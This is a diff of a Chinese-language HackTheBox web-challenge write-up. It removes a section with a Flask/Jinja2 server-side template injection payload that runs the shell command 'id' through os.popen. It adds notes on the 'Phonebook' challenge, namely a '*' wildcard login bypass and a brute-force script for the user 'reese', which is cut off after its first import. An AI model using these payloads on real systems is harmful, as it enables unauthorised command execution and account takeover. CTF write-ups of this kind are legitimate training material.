@@ -1,29 +1,11 @@
 ---
-title: HACKTHEBOX Challeges Web
+title: Phonebook @ HACKTHEBOX Challeges Web
 tags: ctf
 ---
 
-## Templated
+用户名密码使用`*`登录跳转，猜测可以用`*`代替用户名密码字符串。
 
-flask/jinja2 SSTI模板注入
-
-<http://IP:PORT/{{config>}}
-
-<http://IP:PORT/{{request.application>.__globals__.__builtins__.__import__('os').popen('id').read()}}
-
-```sh
-{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
-```
-
-然后就是查看目录，查看flag.txt内容
-
------
-
-## Phonebook
-
-用户名密码使用*登录跳转
-
-网页看到用户名reese，暴力破解密码
+网页看到用户名reese，写个`python`脚本暴力穷举密码
 
 ```python
 import requests
